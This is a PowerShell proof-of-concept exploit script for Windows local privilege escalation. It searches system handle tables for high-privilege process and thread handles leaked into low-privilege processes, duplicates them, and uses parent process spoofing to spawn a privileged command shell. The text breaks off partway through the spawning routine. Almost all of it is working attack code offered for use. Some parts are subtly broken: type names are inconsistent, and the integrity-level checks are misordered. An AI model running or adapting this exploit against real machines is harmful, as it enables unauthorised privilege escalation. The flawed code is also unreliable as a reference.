<#
.SYNOPSIS
    Proof of Concept exploit for leaked process/thread handles (CVE-2025-6759 style)
    
.DESCRIPTION
    This script enumerates system handles to find high-privilege process/thread handles
    that have been leaked into low-privilege processes, and can exploit them to spawn
    privileged processes.
    
.PARAMETER TargetPid
    Optional. Only scan handles held by this specific Process ID.
    
.PARAMETER TargetTid
    Optional. Filter for specific Thread IDs (for thread handle exploitation).
    
.PARAMETER ManualHandle
    Optional. Manually specify a handle value (hex format, e.g., "0x1234") to exploit.
    Requires -TargetPid to specify which process owns the handle.
    
.PARAMETER Exploit
    Switch. If set, attempt to spawn a shell when a vulnerable handle is found.
    
.PARAMETER Command
    Optional. Command to execute in the spawned process. Defaults to cmd.exe.
    
.EXAMPLE
    .\Invoke-HandleExploit.ps1
    Scans all processes for leaked handles
    
.EXAMPLE
    .\Invoke-HandleExploit.ps1 -TargetPid 1234 -Exploit
    Scans process 1234 for leaked handles and attempts exploitation
    
.EXAMPLE
    .\Invoke-HandleExploit.ps1 -TargetPid 1234 -ManualHandle 0x5678 -Exploit
    Manually exploit handle 0x5678 in process 1234
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [int]$TargetPid = 0,
    
    [Parameter(Mandatory=$false)]
    [int]$TargetTid = 0,
    
    [Parameter(Mandatory=$false)]
    [string]$ManualHandle = "",
    
    [Parameter(Mandatory=$false)]
    [switch]$Exploit,
    
    [Parameter(Mandatory=$false)]
    [string]$Command = "cmd.exe"
)

#region P/Invoke Definitions

$NativeMethods = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

    public class NativeMethodsV2 {
    // Constants
    public const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const int PROCESS_CREATE_PROCESS = 0x0080;
    public const int PROCESS_DUP_HANDLE = 0x0040;
    public const int PROCESS_QUERY_INFORMATION = 0x0400;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const int THREAD_ALL_ACCESS = 0x1F03FF;
    public const int THREAD_DIRECT_IMPERSONATION = 0x0200;
    public const int THREAD_SET_CONTEXT = 0x0010;
    public const int DUPLICATE_SAME_ACCESS = 0x2;
    public const int DUPLICATE_CLOSE_SOURCE = 0x1;
    
    // System Information Classes
    public enum SYSTEM_INFORMATION_CLASS {
        SystemHandleInformation = 16,
        SystemExtendedHandleInformation = 64
    }
    
    // Object Information Classes
    public enum OBJECT_INFORMATION_CLASS {
        ObjectBasicInformation = 0,
        ObjectNameInformation = 1,
        ObjectTypeInformation = 2,
        ObjectAllTypesInformation = 3
    }
    
    // Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
        public IntPtr Object;
        public UIntPtr UniqueProcessId;
        public UIntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint HandleAttributes;
        public uint Reserved;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_HANDLE_INFORMATION_EX {
        public UIntPtr NumberOfHandles;
        public UIntPtr Reserved;
        [MarshalAs(UnmanagedType.ByValArray)]
        public SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] Handles;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_TYPE_INFORMATION {
        public UNICODE_STRING Name;
        public uint TotalNumberOfObjects;
        public uint TotalNumberOfHandles;
        public uint TotalPagedPoolUsage;
        public uint TotalNonPagedPoolUsage;
        public uint TotalNamePoolUsage;
        public uint TotalHandleTableUsage;
        public uint HighWaterNumberOfObjects;
        public uint HighWaterNumberOfHandles;
        public uint HighWaterPagedPoolUsage;
        public uint HighWaterNonPagedPoolUsage;
        public uint HighWaterNamePoolUsage;
        public uint HighWaterHandleTableUsage;
        public uint InvalidAttributes;
        public GENERIC_MAPPING GenericMapping;
        public uint ValidAccessMask;
        public byte SecurityRequired;
        public byte MaintainHandleCount;
        public ushort MaintainTypeList;
        public uint PoolType;
        public uint DefaultPagedPoolCharge;
        public uint DefaultNonPagedPoolCharge;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct GENERIC_MAPPING {
        public uint GenericRead;
        public uint GenericWrite;
        public uint GenericExecute;
        public uint GenericAll;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    
    // NtDll Functions
    [DllImport("ntdll.dll")]
    public static extern int NtQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        out int ReturnLength
    );
    
    [DllImport("ntdll.dll")]
    public static extern int NtQueryObject(
        IntPtr Handle,
        OBJECT_INFORMATION_CLASS ObjectInformationClass,
        IntPtr ObjectInformation,
        int ObjectInformationLength,
        out int ReturnLength
    );
    
    [DllImport("ntdll.dll")]
    public static extern int NtDuplicateObject(
        IntPtr SourceProcessHandle,
        IntPtr SourceHandle,
        IntPtr TargetProcessHandle,
        out IntPtr TargetHandle,
        uint DesiredAccess,
        uint Attributes,
        uint Options
    );
    
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(
        IntPtr ProcessHandle,
        int ProcessInformationClass,
        IntPtr ProcessInformation,
        int ProcessInformationLength,
        out int ReturnLength
    );
    
    // Kernel32 Functions
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        int dwDesiredAccess,
        bool bInheritHandle,
        int dwProcessId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(
        int dwDesiredAccess,
        bool bInheritHandle,
        int dwThreadId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int GetProcessId(IntPtr Process);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int GetThreadId(IntPtr Thread);

    [DllImport("kernel32.dll")]
    public static extern int GetCurrentThreadId();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DuplicateHandle(
        IntPtr hSourceProcessHandle,
        IntPtr hSourceHandle,
        IntPtr hTargetProcessHandle,
        out IntPtr lpTargetHandle,
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwOptions
    );
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList,
        uint dwFlags,
        IntPtr Attribute,
        IntPtr lpValue,
        IntPtr cbSize,
        IntPtr lpPreviousValue,
        IntPtr lpReturnSize
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList,
        int dwAttributeCount,
        int dwFlags,
        ref IntPtr lpSize
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle
    );
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(
        IntPtr TokenHandle,
        int TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength,
        out int ReturnLength
    );
    
    public const uint TOKEN_QUERY = 0x0008;
    public const int TokenIntegrityLevel = 25;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_MANDATORY_LABEL {
        public SID_AND_ATTRIBUTES Label;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES {
        public IntPtr Sid;
        public uint Attributes;
    }
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ConvertSidToStringSid(IntPtr pSid, out IntPtr pStringSid);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern void LocalFree(IntPtr hMem);
}
"@

Add-Type -TypeDefinition $NativeMethods -Language CSharp
$nativeMethodsType = [NativeMethodsV2]

#endregion

#region Helper Functions

function Get-ProcessIntegrityLevel {
    param([int]$ProcessId)
    
    try {
        $hProcess = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_QUERY_INFORMATION, $false, $ProcessId)
        if ($hProcess -eq [IntPtr]::Zero) {
            return "Unknown"
        }
        
        $hToken = [IntPtr]::Zero
        if (-not [NativeMethodsV2]::OpenProcessToken($hProcess, [NativeMethodsV2]::TOKEN_QUERY, [ref]$hToken)) {            [NativeMethodsV2]::CloseHandle($hProcess) | Out-Null
            return "Unknown"
        }
        
        $tokenInfoSize = 0
        [NativeMethodsV2]::GetTokenInformation($hToken, [NativeMethodsV2]::TokenIntegrityLevel, [IntPtr]::Zero, 0, [ref]$tokenInfoSize) | Out-Null
        
        $tokenInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tokenInfoSize)
        try {
            if ([NativeMethodsV2]::GetTokenInformation($hToken, [NativeMethodsV2]::TokenIntegrityLevel, $tokenInfo, $tokenInfoSize, [ref]$tokenInfoSize)) {
                $tokenLabel = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tokenInfo, [type][NativeMethods+TOKEN_MANDATORY_LABEL])
                $pStringSid = [IntPtr]::Zero
                if ([NativeMethodsV2]::ConvertSidToStringSid($tokenLabel.Label.Sid, [ref]$pStringSid)) {
                    $sidString = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($pStringSid)
                    [NativeMethodsV2]::LocalFree($pStringSid) | Out-Null
                    
                    if ($sidString -match "S-1-16-(\d+)") {
                        $rid = [int]$matches[1]
                        if ($rid -ge 0x1000) { return "System" }
                        elseif ($rid -ge 0x3000) { return "High" }
                        elseif ($rid -ge 0x2000) { return "Medium" }
                        else { return "Low" }
                    }
                }
            }
        } finally {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tokenInfo)
            [NativeMethodsV2]::CloseHandle($hToken) | Out-Null
            [NativeMethodsV2]::CloseHandle($hProcess) | Out-Null
        }
    } catch {
        return "Unknown"
    }
    
    return "Unknown"
}

function Get-HandleTypeIndex {
    param(
        [string]$TypeName
    )
    
    # Get current process handle
    $currentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
    $hCurrentProcess = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_ALL_ACCESS, $false, $currentPid)
    
    if ($hCurrentProcess -eq [IntPtr]::Zero) {
        Write-Warning "Failed to open current process"
        return $null
    }
    
    try {
        # Query object type information for our own process handle
        $objectInfoSize = 0
        [NativeMethodsV2]::NtQueryObject($hCurrentProcess, [NativeMethods+OBJECT_INFORMATION_CLASS]::ObjectTypeInformation, [IntPtr]::Zero, 0, [ref]$objectInfoSize) | Out-Null
        
        if ($objectInfoSize -eq 0) {
            return $null
        }
        
        $objectInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($objectInfoSize)
        try {
            $status = [NativeMethodsV2]::NtQueryObject($hCurrentProcess, [NativeMethods+OBJECT_INFORMATION_CLASS]::ObjectTypeInformation, $objectInfo, $objectInfoSize, [ref]$objectInfoSize)
            
            if ($status -eq 0) {
                $typeInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($objectInfo, [type][NativeMethods+OBJECT_TYPE_INFORMATION])
                $typeNamePtr = $typeInfo.Name.Buffer
                $typeNameLength = $typeInfo.Name.Length / 2
                $queriedTypeName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($typeNamePtr, $typeNameLength)
                
                # For Process type, we need to enumerate all handles to find the type index
                # This is a simplified approach - we'll enumerate and match by object type
                return Get-HandleTypeIndexByEnumeration
            }
        } finally {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($objectInfo)
        }
    } finally {
        [NativeMethodsV2]::CloseHandle($hCurrentProcess) | Out-Null
    }
    
    return $null
}

function Get-HandleTypeIndexByEnumeration {
    # Enumerate handles and find Process/Thread type indices by querying object types
    $processTypeIndex = $null
    $threadTypeIndex = $null
    
    $bufferSize = 0x10000
    $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
    
    # Ensure we have at least one Process and one Thread handle in the current process
    # so we can reliably identify the type indices.
    $hCurrentProcessForTypes = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_QUERY_INFORMATION, $false, [System.Diagnostics.Process]::GetCurrentProcess().Id)
    $hCurrentThreadForTypes = [NativeMethodsV2]::OpenThread([NativeMethodsV2]::THREAD_ALL_ACCESS, $false, [NativeMethodsV2]::GetCurrentThreadId())
    
    try {
        $returnLength = 0
        $status = [NativeMethodsV2]::NtQuerySystemInformation(
            [NativeMethods+SYSTEM_INFORMATION_CLASS]::SystemExtendedHandleInformation,
            $buffer,
            $bufferSize,
            [ref]$returnLength
        )
        
        if ($status -eq 0xC0000004) { # STATUS_INFO_LENGTH_MISMATCH
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
            $bufferSize = $returnLength
            $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
            $status = [NativeMethodsV2]::NtQuerySystemInformation(
                [NativeMethods+SYSTEM_INFORMATION_CLASS]::SystemExtendedHandleInformation,
                $buffer,
                $bufferSize,
                [ref]$returnLength
            )
        }
        
        if ($status -eq 0) {
            $handleInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($buffer, [type][NativeMethods+SYSTEM_HANDLE_INFORMATION_EX])
            $handleCount = [int][uint64]$handleInfo.NumberOfHandles
            
            $handleEntrySize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][NativeMethods+SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX])
            $currentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
            
            $typeIndices = @{}
            
            for ($i = 0; $i -lt $handleCount; $i++) {
                if ($processTypeIndex -ne $null -and $threadTypeIndex -ne $null) {
                    break
                }

                $entryPtr = [IntPtr]($buffer.ToInt64() + 16 + ($i * $handleEntrySize))
                $entry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($entryPtr, [type][NativeMethods+SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX])
                
                $ownerPid = [int][uint64]$entry.UniqueProcessId
                if ($ownerPid -eq $currentPid) {
                    $handleValue = $entry.HandleValue
                    $typeIndex = $entry.ObjectTypeIndex
                    
                    if (-not $typeIndices.ContainsKey($typeIndex)) {
                        # Try to open and query this handle
                        $hProcess = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_DUP_HANDLE, $false, $currentPid)
                        if ($hProcess -ne [IntPtr]::Zero) {
                            $hDup = [IntPtr]::Zero
                            $dupStatus = [NativeMethodsV2]::NtDuplicateObject(
                                $hProcess,
                                $handleValue,
                                [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_ALL_ACCESS, $false, $currentPid),
                                [ref]$hDup,
                                0,
                                0,
                                0
                            )
                            
                            if ($dupStatus -eq 0 -and $hDup -ne [IntPtr]::Zero) {
                                $objInfoSize = 0
                                [NativeMethodsV2]::NtQueryObject($hDup, [NativeMethods+OBJECT_INFORMATION_CLASS]::ObjectTypeInformation, [IntPtr]::Zero, 0, [ref]$objInfoSize) | Out-Null
                                
                                if ($objInfoSize -gt 0) {
                                    $objInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($objInfoSize)
                                    try {
                                        if ([NativeMethodsV2]::NtQueryObject($hDup, [NativeMethods+OBJECT_INFORMATION_CLASS]::ObjectTypeInformation, $objInfo, $objInfoSize, [ref]$objInfoSize) -eq 0) {
                                            $typeInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($objInfo, [type][NativeMethods+OBJECT_TYPE_INFORMATION])
                                            $typeNamePtr = $typeInfo.Name.Buffer
                                            $typeNameLength = $typeInfo.Name.Length / 2
                                            $typeName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($typeNamePtr, $typeNameLength)
                                            
                                            $typeIndices[$typeIndex] = $typeName
                                            
                                            if ($typeName -eq "Process" -and $null -eq $processTypeIndex) {
                                                $processTypeIndex = $typeIndex
                                            }
                                            if ($typeName -eq "Thread" -and $null -eq $threadTypeIndex) {
                                                $threadTypeIndex = $typeIndex
                                            }
                                        }
                                    } finally {
                                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($objInfo)
                                    }
                                }
                                
                                [NativeMethodsV2]::CloseHandle($hDup) | Out-Null
                            }
                            [NativeMethodsV2]::CloseHandle($hProcess) | Out-Null
                        }
                    }
                }
            }
        }
    } finally {
        if ($hCurrentProcessForTypes -and $hCurrentProcessForTypes -ne [IntPtr]::Zero) {
            [NativeMethodsV2]::CloseHandle($hCurrentProcessForTypes) | Out-Null
        }
        if ($hCurrentThreadForTypes -and $hCurrentThreadForTypes -ne [IntPtr]::Zero) {
            [NativeMethodsV2]::CloseHandle($hCurrentThreadForTypes) | Out-Null
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
    }
    
    return @{
        Process = $processTypeIndex
        Thread = $threadTypeIndex
    }
}

function Get-SystemHandles {
    param(
        [int]$FilterPid = 0
    )
    
    $bufferSize = 0x10000
    $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
    $handles = @()
    
    try {
        $returnLength = 0
        $status = [NativeMethodsV2]::NtQuerySystemInformation(
            [NativeMethodsV2+SYSTEM_INFORMATION_CLASS]::SystemExtendedHandleInformation,
            $buffer,
            $bufferSize,
            [ref]$returnLength
        )
        
        if ($status -eq 0xC0000004) { # STATUS_INFO_LENGTH_MISMATCH
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
            $bufferSize = $returnLength * 2
            $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
            $status = [NativeMethodsV2]::NtQuerySystemInformation(
                [NativeMethodsV2+SYSTEM_INFORMATION_CLASS]::SystemExtendedHandleInformation,
                $buffer,
                $bufferSize,
                [ref]$returnLength
            )
        }
        
        if ($status -ne 0) {
            Write-Error "Failed to query system handles: 0x$($status.ToString('X8'))"
            return $handles
        }
        
        $handleInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($buffer, [type][NativeMethodsV2+SYSTEM_HANDLE_INFORMATION_EX])

        $handleCount = [int][uint64]$handleInfo.NumberOfHandles
        
        Write-Verbose "Found $handleCount total handles"
        
        $handleEntrySize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][NativeMethodsV2+SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX])
        
        # Get type indices
        $typeIndices = Get-HandleTypeIndexByEnumeration
        $processTypeIndex = $typeIndices.Process
        $threadTypeIndex = $typeIndices.Thread
        
        Write-Verbose "Process Type Index: $processTypeIndex, Thread Type Index: $threadTypeIndex"
        
        for ($i = 0; $i -lt $handleCount; $i++) {
            $entryPtr = [IntPtr]($buffer.ToInt64() + 16 + ($i * $handleEntrySize))
            $entry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($entryPtr, [type][NativeMethodsV2+SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX])
            
            $ownerPid = [int][uint64]$entry.UniqueProcessId
            $handleValue = $entry.HandleValue
            $typeIndex = $entry.ObjectTypeIndex
            $access = $entry.GrantedAccess
            
            # Filter by PID if specified
            if ($FilterPid -ne 0 -and $ownerPid -ne $FilterPid) {
                continue
            }
            
            # Filter for Process or Thread handles
            if ($typeIndex -ne $processTypeIndex -and $typeIndex -ne $threadTypeIndex) {
                continue
            }
            
            $handleType = if ($typeIndex -eq $processTypeIndex) { "Process" } else { "Thread" }
            
            # Get owner process integrity
            $ownerIntegrity = Get-ProcessIntegrityLevel $ownerPid
            
            # Try to get target process/thread ID
            $targetPid = $null
            $targetTid = $null
            
            $hOwnerProcess = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_DUP_HANDLE, $false, $ownerPid)
            if ($hOwnerProcess -ne [IntPtr]::Zero) {
                $hDup = [IntPtr]::Zero
                $hCurrentProcess = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_ALL_ACCESS, $false, [System.Diagnostics.Process]::GetCurrentProcess().Id)
                
                if ($hCurrentProcess -ne [IntPtr]::Zero) {
                    $dupStatus = [NativeMethodsV2]::NtDuplicateObject(
                        $hOwnerProcess,
                        $handleValue,
                        $hCurrentProcess,
                        [ref]$hDup,
                        0,
                        0,
                        0
                    )
                    
                    if ($dupStatus -eq 0 -and $hDup -ne [IntPtr]::Zero) {
                        if ($handleType -eq "Process") {
                            $targetPid = [NativeMethodsV2]::GetProcessId($hDup)
                        } else {
                            $targetTid = [NativeMethodsV2]::GetThreadId($hDup)
                            # Get thread's process ID
                            $hThreadProcess = [IntPtr]::Zero
                            # Note: Getting process from thread requires NtQueryInformationThread which we'd need to add
                        }
                        
                        [NativeMethodsV2]::CloseHandle($hDup) | Out-Null
                    }
                    [NativeMethodsV2]::CloseHandle($hCurrentProcess) | Out-Null
                }
                [NativeMethodsV2]::CloseHandle($hOwnerProcess) | Out-Null
            }
            
            if ($targetPid) {
                $targetIntegrity = Get-ProcessIntegrityLevel $targetPid
            } else {
                $targetIntegrity = "Unknown"
            }
            
            # Check for interesting access rights
            $interestingAccess = $false
            $accessRights = @()
            
            if ($handleType -eq "Process") {
                if (($access -band [NativeMethodsV2]::PROCESS_ALL_ACCESS) -eq [NativeMethodsV2]::PROCESS_ALL_ACCESS) {
                    $interestingAccess = $true
                    $accessRights += "PROCESS_ALL_ACCESS"
                }
                if ($access -band [NativeMethodsV2]::PROCESS_CREATE_PROCESS) {
                    $interestingAccess = $true
                    $accessRights += "PROCESS_CREATE_PROCESS"
                }
                if ($access -band [NativeMethodsV2]::PROCESS_DUP_HANDLE) {
                    $interestingAccess = $true
                    $accessRights += "PROCESS_DUP_HANDLE"
                }
                if ($access -band [NativeMethodsV2]::PROCESS_VM_WRITE) {
                    $interestingAccess = $true
                    $accessRights += "PROCESS_VM_WRITE"
                }
            } else {
                if (($access -band [NativeMethodsV2]::THREAD_ALL_ACCESS) -eq [NativeMethodsV2]::THREAD_ALL_ACCESS) {
                    $interestingAccess = $true
                    $accessRights += "THREAD_ALL_ACCESS"
                }
                if ($access -band [NativeMethodsV2]::THREAD_DIRECT_IMPERSONATION) {
                    $interestingAccess = $true
                    $accessRights += "THREAD_DIRECT_IMPERSONATION"
                }
                if ($access -band [NativeMethodsV2]::THREAD_SET_CONTEXT) {
                    $interestingAccess = $true
                    $accessRights += "PROCESS_SET_CONTEXT"
                }
            }
            
            if ($interestingAccess) {
                # Store handle value as UInt64 for later use
                $handleValueUInt64 = [UInt64]$handleValue
                
                $handles += [PSCustomObject]@{
                    OwnerPid = $ownerPid
                    OwnerIntegrity = $ownerIntegrity
                    HandleValue = $handleValueUInt64
                    HandleValueHex = "0x$($handleValueUInt64.ToString('X'))"
                    HandleType = $handleType
                    TargetPid = $targetPid
                    TargetTid = $targetTid
                    TargetIntegrity = $targetIntegrity
                    AccessRights = $accessRights -join ", "
                    GrantedAccess = "0x$($access.ToString('X8'))"
                }
            }
        }
    } finally {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
    }
    
    return $handles
}

#endregion

#region Exploitation Functions

function Invoke-ExploitProcess {
    param(
        [int]$OwnerPid,
        [IntPtr]$HandleValue,
        [int]$TargetPid,
        [string]$Command
    )
    
    Write-Host "[*] Attempting to exploit leaked handle..." -ForegroundColor Yellow
    Write-Host "    Owner PID: $OwnerPid" -ForegroundColor Gray
    Write-Host "    Target PID: $TargetPid" -ForegroundColor Gray
    Write-Host "    Handle: $HandleValue" -ForegroundColor Gray
    
    $currentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
    
    # If handle is in another process, we need to duplicate it to ourselves
    if ($OwnerPid -ne $currentPid) {
        Write-Warning "Handle is in process $OwnerPid, not current process. Attempting to duplicate..."
        
        $hOwnerProcess = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_DUP_HANDLE, $false, $OwnerPid)
        if ($hOwnerProcess -eq [IntPtr]::Zero) {
            Write-Error "Failed to open owner process. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            return $false
        }
        
        $hCurrentProcess = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_ALL_ACCESS, $false, $currentPid)
        if ($hCurrentProcess -eq [IntPtr]::Zero) {
            [NativeMethodsV2]::CloseHandle($hOwnerProcess) | Out-Null
            Write-Error "Failed to open current process"
            return $false
        }
        
        $hDup = [IntPtr]::Zero
        $dupStatus = [NativeMethodsV2]::NtDuplicateObject(
            $hOwnerProcess,
            $HandleValue,
            $hCurrentProcess,
            [ref]$hDup,
            [NativeMethodsV2]::PROCESS_ALL_ACCESS,
            0,
            0
        )
        
        [NativeMethodsV2]::CloseHandle($hOwnerProcess) | Out-Null
        [NativeMethodsV2]::CloseHandle($hCurrentProcess) | Out-Null
        
        if ($dupStatus -ne 0 -or $hDup -eq [IntPtr]::Zero) {
            Write-Error "Failed to duplicate handle. Status: 0x$($dupStatus.ToString('X8'))"
            return $false
        }
        
        $HandleValue = $hDup
        Write-Host "[+] Successfully duplicated handle to current process" -ForegroundColor Green
    }
    
    # Verify the handle points to the target process
    $verifyPid = [NativeMethodsV2]::GetProcessId($HandleValue)
    if ($verifyPid -ne $TargetPid) {
        Write-Warning "Handle verification: Expected PID $TargetPid, got $verifyPid"
    }
    
    # Use Parent Process Spoofing to spawn a child process
    # This requires PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
    $PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
    $EXTENDED_STARTUPINFO_PRESENT = 0x00080000
    
    $attributeListSize = 0
    $attributeList = [IntPtr]::Zero
    
    if (-not [NativeMethodsV2]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$attributeListSize)) {
        $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        if ($lastError -ne 122) { # ERROR_INSUFFICIENT_BUFFER
            Write-Error "Failed to initialize attribute list size. Error: $lastError"
            if ($OwnerPid -ne $currentPid) {
                [NativeMethodsV2]::CloseHandle($HandleValue) | Out-Null
            }
            return $false
        }
    }
    
    $attributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($attributeListSize)
    
    try {
        if (-not [NativeMethodsV2]::InitializeProcThreadAttributeList($attributeList, 1, 0, [ref]$attributeListSize)) {
            Write-Error "Failed to initialize attribute list. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            if ($OwnerPid -ne $currentPid) {
                [NativeMethodsV2]::CloseHandle($HandleValue) | Out-Null
            }
            return $false
        }
        
        $parentProcessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
        [System.Runtime.InteropServices.Marshal]::WriteIntPtr($parentProcessPtr, $HandleValue)
        
        if (-not [NativeMethodsV2]::UpdateProcThreadAttribute(
            $attributeList,
            0,
            [IntPtr]$PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            $parentProcessPtr,
            [IntPtr][IntPtr]::Size,
            [IntPtr]::Zero,
            [IntPtr]::Zero
        )) {
            Write-Error "Failed to update proc thread attribute. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($parentProcessPtr)
            if ($OwnerPid -ne $currentPid) {
                [NativeMethodsV2]::CloseHandle($HandleValue) | Out-Null
            }
            return $false
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($parentProcessPtr)
        
        $startupInfo = New-Object NativeMethods+STARTUPINFOEX
        $startupInfo.StartupInfo = New-Object NativeMethods+STARTUPINFO
        $startupInfo.StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([type][NativeMethods+STARTUPINFOEX])
        $startupInfo.lpAttributeList = $attributeList
        
        $processInfo = New-Object NativeMethods+PROCESS_INFORMATION
        
        Write-Host "[*] Spawning process: $Command" -ForegroundColor Yellow
        
        $success = [NativeMethodsV2]::CreateProcess(
            $null,
            $Command,
            [IntPtr]::Zero,
            [IntPtr]::Zero,
            $false,
            $EXTENDED_STARTUPINFO_PRESENT,
            [IntPtr]::Zero,
            $null,
            [ref]$startupInfo,
            [ref]$processInfo
        )
        
        [NativeMethodsV2]::DeleteProcThreadAttributeList($attributeList)
        
        if ($success) {
            Write-Host "[+] Successfully spawned process with PID $($processInfo.dwProcessId)" -ForegroundColor Green
